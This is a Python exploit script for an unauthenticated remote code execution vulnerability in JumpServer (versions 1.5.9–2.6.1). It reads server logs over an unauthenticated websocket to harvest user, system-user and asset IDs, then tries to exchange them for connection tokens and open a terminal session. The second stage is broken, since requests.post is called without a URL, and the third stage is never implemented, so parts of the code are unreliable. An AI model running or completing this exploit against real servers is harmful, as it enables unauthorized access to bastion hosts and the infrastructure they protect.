#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import argparse

import requests
import websockets
import json
import logging
import ssl
import asyncio
from datetime import datetime
from urllib.parse import urlparse,parse_qs
import copy
import re

logging.basicConfig(level=logging.INFO,format="%(asctime)s | %(name)s | [%(levelname)s]: %(message)s")
basicLogger = logging.getLogger('exploit')
readLogLogger = logging.getLogger('remotelog')


# ----- DO NOT CHANGE, POST ---[BLOCK START]---
PATH_PAYLOAD_1 = '/ws/ops/tasks/log/'
PATH_PAYLOAD_2 = '/api/v1/users/connection-token/?user-only=1'
PATH_PAYLOAD_2_ALT = '/api/v1/authentication/connection-token/?user-only=1'
REFERER_PAYLOAD_2 = '/luna/?_={tms}'.format(tms=str(int(datetime.timestamp(datetime.now()))))

GLOBAL_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'
}
GLOBAL_TIMEOUT=5
# Stage 3, HTTP, Switching to WS
PATH_PAYLOAD_3 = '/koko/ws/token/?target_id={tid}'
# ----- DO NOT CHANGE, POST ---[BLOCK END]---


# This should be changed according to current situation
# Stage 1
PAYLOAD_1 = '{"task":"/opt/jumpserver/logs/gunicorn"}'
# Stage 2
PATH_PAYLOAD_2_USE = PATH_PAYLOAD_2


class BasicInfo(object):
    def __init__(self, oriurl):
        self.ssl = None
        data = urlparse(oriurl)
        if data.scheme == 'https':
            basicLogger.debug("SSL Detected!")
            self.ssl = self.getDisabledSSLVerificationContext()
        elif data.scheme == 'http':
            basicLogger.debug("Non-SSL Detected!")
        else:
            raise ValueError("URL Scheme is not supported.")
        self.host = data.netloc

    @staticmethod
    def getDisabledSSLVerificationContext():
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    # Return [URL, SSL, HEADER, POSTDATA]
    def getVulnURL(self, step):
        if self.ssl:
            schema_h = 'https://'
            schema_w = 'wss://'
        else:
            schema_h = 'http://'
            schema_w = 'ws://'

        if step == 1:
            # Get Log
            return [schema_w + self.host + PATH_PAYLOAD_1, self.ssl, GLOBAL_HEADERS, PAYLOAD_1]
        elif step == 2:
            nheader = copy.deepcopy(GLOBAL_HEADERS)
            nheader['Referer'] = REFERER_PAYLOAD_2
            readLogLogger.info("-------------------------------------------------------------------------")
            # Get Token Alternative Way
            readLogLogger.info("If default request for token exchanging is failed, try again.")
            readLogLogger.info(" You should see :  `!!!! FAILED !!!!` notification BEFORE you try again.")
            readLogLogger.info("Possible Reason: Previous Token Expired, OR API Endpoint blocked.")
            readLogLogger.info("Try: Re-run this program or change PATH_PAYLOAD_2_USE to PATH_PAYLOAD_2_ALT.")
            readLogLogger.info("-------------------------------------------------------------------------")
            # Get Token
            return [schema_h + self.host + PATH_PAYLOAD_2_USE, self.ssl, nheader, {}]
        elif step == 3:
            # Start RCE
            return [schema_h + self.host + PATH_PAYLOAD_3, self.ssl, GLOBAL_HEADERS, {}]
        else:
            raise RuntimeError("Internal Function Error. Contact Author.")

    def setattr(self,name,value):
        self.__setattr__(name, value)


async def runWS(url, ssl, payload):
    async with websockets.connect(url, ssl=ssl) as wsapp:
        buffer = ''
        await wsapp.send(payload)
        while True:
            resp = await wsapp.recv()
            try:
                msg = json.loads(resp)['message']
                if '/api/v1/perms/asset-permissions/user/validate/?action_name=connect&asset_id=' in msg:
                    buffer += msg
                    resp = await wsapp.recv()
                    buffer += json.loads(resp)['message']
                    buffer += '\r\n'
                    break
            except:
                pass
        return buffer


class STEP1(object):
    def __init__(self, upper):
        self.upper = upper

    def run(self):
        req = self.upper.getVulnURL(1)
        self.loop = asyncio.get_event_loop()
        data = self.loop.run_until_complete(runWS(req[0], req[1], req[3]))
        pattern = re.compile(r'\/api\/v1\/perms\/asset-permissions\/user\/validate\/(.*? )')
        m = pattern.search(data)
        finalurl = m.group()[:-1]
        keyid = parse_qs(urlparse(finalurl, scheme='http').query)
        try:
            keydata = {"user": keyid['user_id'][0], "system_user": keyid['system_user_id'][0], "asset": keyid['asset_id'][0]}
            self.upper.setattr('payload_post', keydata)
        except:
            raise ValueError("Token not found.")


class STEP2(object):
    def __init__(self, upper):
        self.upper = upper

    def run(self):
        tmp1, tmp2, tmp3, tmp4 = self.upper.getVulnURL(2)
        r = requests.post(verify=False, )


def __main__():
    parser = argparse.ArgumentParser(description="JumpServer v1.5.9~2.4.5 v2.5.x~v2.5.4 v2.6.x~v2.6.1 Unauthenticated RCE")
    parser.add_argument("host", default="http://127.0.0.1:8080", type=str, help="JumpServer Location (http[s]://IP Addr:PORT)")
    args = parser.parse_args()
    basicLogger.warning("Note: If you use SSL, Cert Verification is disabled.")
    basicLogger.debug("User Offered Connection Info:", args.host)
    # https://websockets.readthedocs.io/en/stable/limitations.html?highlight=proxy#limitations
    # Note: This library does NOT support proxy. So please `proxychains` yourself.
    binfo = BasicInfo(args.host)
    action1 = STEP1(binfo)
    action1.run()
    action2 = STEP2(binfo)
    action2.run()


if __name__ == '__main__':
    __main__()